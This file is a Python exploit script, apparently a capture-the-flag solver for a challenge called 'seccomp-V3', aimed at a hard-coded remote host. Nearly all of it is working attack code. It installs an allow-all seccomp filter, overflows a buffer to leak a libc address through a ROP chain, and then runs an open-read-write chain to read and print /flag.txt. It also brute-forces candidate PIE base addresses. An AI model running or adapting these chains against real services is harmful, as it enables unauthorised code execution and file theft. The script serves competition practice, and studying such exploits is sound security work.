#!/usr/bin/env python3
"""
seccomp-V3 Standalone Exploit (No Pwntools Dependency)
Runs natively on Windows Python 3.12 without term color errors.
"""
import socket
import struct
import sys
import time
import re

HOST = "144.79.188.39"
PORT = 42244   # Default port, or pass as command line argument: python solve_standalone.py <port>

# BPF: single ALLOW-ALL instruction: BPF_RET | BPF_K (ALLOW = 0x7fff0000)
BPF_ALLOW_ALL = struct.pack("<HBBI", 0x06, 0, 0, 0x7fff0000)

# Binary relative offsets
PAD = 0x78   # 120 bytes: buffer (104 bytes) + saved RBP (8) + saved R12 (8)
G_POP_RDI     = 0x145b
G_POP_RSI_R15 = 0x1459
G_RET         = 0x101a
PLT_PUTS      = 0x1154
PLT_OPEN      = 0x1214
PLT_READ      = 0x1184
GOT_PUTS      = 0x3f60
BSS           = 0x4220
MAIN          = 0x1240
TRUNC_SIZE    = 0x10040   # 65600 (ax = 0x40 <= 0x60)

# glibc 2.35 x86_64 offsets
PUTS_OFF     = 0x80e50
POP_RDX_OFF  = 0x11f2e7

def p64(x):
    return struct.pack("<Q", x)

def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

def recvuntil(s, delim, timeout=10):
    s.settimeout(timeout)
    data = b""
    while delim not in data:
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data

def load_and_install(s):
    # Option 0: New rule
    recvuntil(s, b"-1) exit\n")
    s.sendall(b"0\n")
    recvuntil(s, b"1) use examples\n")
    s.sendall(b"0\n")
    recvuntil(s, b"size?\n")
    s.sendall(str(len(BPF_ALLOW_ALL)).encode() + b"\n")
    recvuntil(s, b"note?\n")
    s.sendall(BPF_ALLOW_ALL)
    
    # Option 3: Install rule
    recvuntil(s, b"-1) exit\n")
    s.sendall(b"3\n")
    resp = recvuntil(s, b"-1) exit\n")
    print(f"[*] Filter installed successfully: {resp.splitlines()[0]!r}")

def trigger_overflow(s, payload):
    s.sendall(b"5\n")
    recvuntil(s, b"size?\n")
    s.sendall(str(TRUNC_SIZE).encode() + b"\n")
    recvuntil(s, b"note?\n")
    s.sendall(payload)

def exploit(pie_base, host, port):
    print(f"[*] Attempting connection to {host}:{port} with PIE_BASE={hex(pie_base)}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(12)
    s.connect((host, port))

    p = lambda x: p64(pie_base + x)

    # ── Phase 1: Install BPF & Leak Libc ──
    load_and_install(s)

    stage1 = (
        b"A" * PAD +
        p64(pie_base + BSS) +
        p64(0) +
        p(G_RET) +
        p(G_POP_RDI) +
        p64(pie_base + GOT_PUTS) +
        p(PLT_PUTS) +
        p(MAIN)
    )
    print("[*] Sending Stage 1 (Leak puts address)...")
    trigger_overflow(s, stage1)

    leak_data = recvuntil(s, b"\n", timeout=6)
    if len(leak_data) < 2:
        print(f"[-] Empty or short leak: {leak_data!r}")
        s.close()
        return False

    libc_puts = u64(leak_data.rstrip(b"\n")[:8])
    print(f"[+] Leaked libc.puts = {hex(libc_puts)}")

    libc_base = libc_puts - PUTS_OFF
    pop_rdx = libc_base + POP_RDX_OFF
    print(f"[+] Libc Base = {hex(libc_base)}")
    print(f"[+] pop rdx gadget = {hex(pop_rdx)}")

    # ── Phase 2: Install BPF & Trigger ORW ──
    load_and_install(s)

    bss_path = pie_base + BSS
    bss_buf  = pie_base + BSS + 0x30

    orw = (
        # 1. read(0, bss_path, 16) -> reads "/flag.txt\0"
        p(G_POP_RDI) + p64(0) +
        p(G_POP_RSI_R15) + p64(bss_path) + p64(0) +
        p64(pop_rdx) + p64(16) +
        p(PLT_READ) +

        # 2. open(bss_path, 0)
        p(G_POP_RDI) + p64(bss_path) +
        p(G_POP_RSI_R15) + p64(0) + p64(0) +
        p(PLT_OPEN) +

        # 3. read(3, bss_buf, 0x100)
        p(G_POP_RDI) + p64(3) +
        p(G_POP_RSI_R15) + p64(bss_buf) + p64(0) +
        p64(pop_rdx) + p64(0x100) +
        p(PLT_READ) +

        # 4. puts(bss_buf) -> prints flag
        p(G_POP_RDI) + p64(bss_buf) +
        p(PLT_PUTS)
    )

    stage2 = (
        b"A" * PAD +
        p64(pie_base + BSS) +
        p64(0) +
        orw
    )

    print("[*] Sending Stage 2 (ORW ROP Chain)...")
    trigger_overflow(s, stage2)
    time.sleep(0.3)

    # Send flag path
    s.sendall(b"/flag.txt\x00\x00\x00\x00\x00\x00\x00")
    time.sleep(0.5)

    # Receive response
    out = b""
    s.settimeout(4)
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            out += chunk
        except Exception:
            break

    print(f"[*] Raw target response:\n{out.decode(errors='replace')}")

    m = re.search(rb"PTITCTF\{[^}]+\}", out)
    if m:
        flag = m.group(0).decode()
        print(f"\n[+] ==========================================")
        print(f"[+] SUCCESS! FLAG: {flag}")
        print(f"[+] ==========================================\n")
        with open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\final_flag.txt", "w") as f:
            f.write(flag + "\n")
        s.close()
        return True

    s.close()
    return False

if __name__ == "__main__":
    target_port = int(sys.argv[1]) if len(sys.argv) > 1 else PORT
    target_host = sys.argv[2] if len(sys.argv) > 2 else HOST

    print(f"[*] Starting seccomp-V3 solver on {target_host}:{target_port}")
    
    # Try candidate PIE bases
    candidates = [
        0x555555554000,
        0x555555400000,
        0x565555554000,
        0x400000
    ]

    for base in candidates:
        try:
            if exploit(base, target_host, target_port):
                sys.exit(0)
        except Exception as e:
            print(f"[-] Base {hex(base)} failed: {e}")

    print("[-] Finished attempts. If ASLR is enabled on live, use 2-byte partial overwrite or brute force.")
